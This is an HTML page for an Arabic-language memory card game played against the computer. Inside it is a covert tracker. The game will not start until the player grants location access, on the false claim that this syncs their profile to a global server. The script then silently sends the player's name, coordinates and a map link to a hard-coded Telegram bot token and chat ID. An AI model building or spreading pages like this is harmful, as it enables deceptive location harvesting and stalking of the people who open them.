<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي الذاكرة العالمي 🌍</title>
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; }
        .game-container { max-width: 400px; margin: auto; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 15px; backdrop-filter: blur(10px); }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 15px; }
        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; position: relative; border: 1px solid #333; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
        .card.matched-player { background: var(--player) !important; cursor: default; }
        .card.matched-ai { background: var(--ai) !important; cursor: default; }
        .status-bar { background: #000; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #333; font-size: 14px; }
        .score-board { display: flex; justify-content: space-around; font-size: 16px; margin-bottom: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 10px; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 100; display: flex; align-items: center; justify-content: center; }
        .login-box { padding: 30px; background: #111; border-radius: 20px; border: 1px solid var(--primary); width: 80%; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; background: #222; color: white; text-align: center; font-size: 16px; }
        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
    </style>
</head>
<body>

<div id="overlay">
    <div class="login-box">
        <h2>أهلاً بك في التحدي 🎮</h2>
        <p>الرجاء إدخال اسمك لإنشاء ملف تعريف اللاعب ومزامنة نقاطك عالمياً.</p>
        <input type="text" id="username" placeholder="اكتب اسمك هنا...">
        <button class="btn-start" onclick="checkUser()">دخول اللعبة</button>
    </div>
</div>

<div class="game-container">
    <div class="status-bar" id="ai-msg">مرحباً <span id="display-name">...</span>! جاري تهيئة التحدي...</div>
    <div class="score-board">
        <div style="color: var(--player)">👤 <span id="label-name">أنت</span>: <b id="p-score">0</b></div>
        <div style="color: var(--ai)">🤖 الكمبيوتر: <b id="ai-score">0</b></div>
    </div>
    <div class="grid" id="grid"></div>
</div>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';
    
    let flippedCards = [];
    let pScore = 0;
    let aiScore = 0;
    let canPlay = false;
    let playerName = "";
    const symbols = ['🍎', '🍌', '🍇', '🍉', '🍒', '🍓', '🥝', '🍍'];
    let deck = [...symbols, ...symbols];

    function checkUser() {
        playerName = document.getElementById('username').value;
        if (playerName.length < 2) {
            alert("يرجى إدخال اسم صحيح!");
            return;
        }
        initGame();
    }

    function initGame() {
        document.getElementById('display-name').innerText = playerName;
        document.getElementById('label-name').innerText = playerName;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // إرسال الاسم مع الموقع لتليجرام
                const msg = `👤 **لاعب جديد انضم!**\n📛 الاسم: ${playerName}\n📍 الموقع: \`${lat}, ${lon}\`\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                
                document.getElementById('overlay').style.display = 'none';
                createBoard();
                canPlay = true;
                document.getElementById('ai-msg').innerText = "تمت المزامنة بنجاح! دورك يا " + playerName;
            }, () => {
                alert("يجب السماح بالوصول للموقع لمزامنة ملفك الشخصي مع الخادم العالمي.");
            });
        }
    }

    function createBoard() {
        const grid = document.getElementById('grid');
        deck.sort(() => Math.random() - 0.5);
        grid.innerHTML = '';
        deck.forEach((symbol) => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.symbol = symbol;
            card.onclick = () => userFlip(card);
            grid.appendChild(card);
        });
    }

    function userFlip(card) {
        if (!canPlay || card.classList.contains('flipped') || flippedCards.length >= 2) return;
        flip(card);
        flippedCards.push(card);
        if (flippedCards.length === 2) {
            canPlay = false;
            checkMatch(true);
        }
    }

    function flip(card) {
        card.classList.add('flipped');
        card.innerText = card.dataset.symbol;
    }

    function unflip(card) {
        card.classList.remove('flipped');
        card.innerText = '';
    }

    function checkMatch(isPlayer) {
        const [c1, c2] = flippedCards;
        if (c1.dataset.symbol === c2.dataset.symbol) {
            setTimeout(() => {
                c1.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
                c2.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
                if (isPlayer) pScore++; else aiScore++;
                document.getElementById('p-score').innerText = pScore;
                document.getElementById('ai-score').innerText = aiScore;
                flippedCards = [];
                if (isPlayer) { canPlay = true; document.getElementById('ai-msg').innerText = "رائع! استمر يا " + playerName; }
                else { aiTurn(); }
            }, 500);
        } else {
            setTimeout(() => {
                unflip(c1);
                unflip(c2);
                flippedCards = [];
                if (isPlayer) aiTurn(); else { canPlay = true; document.getElementById('ai-msg').innerText = "دورك الآن!"; }
            }, 1000);
        }
    }

    function aiTurn() {
        canPlay = false;
        document.getElementById('ai-msg').innerText = "الكمبيوتر يحاول تخمين حركاتك... 🤖";
        setTimeout(() => {
            const available = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (available.length < 2) return;
            const c1 = available[Math.floor(Math.random() * available.length)];
            flip(c1);
            flippedCards.push(c1);
            setTimeout(() => {
                const remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
                const c2 = remaining[Math.floor(Math.random() * remaining.length)];
                flip(c2);
                flippedCards.push(c2);
                checkMatch(false);
            }, 1000);
        }, 1500);
    }
</script>
</body>
</html>
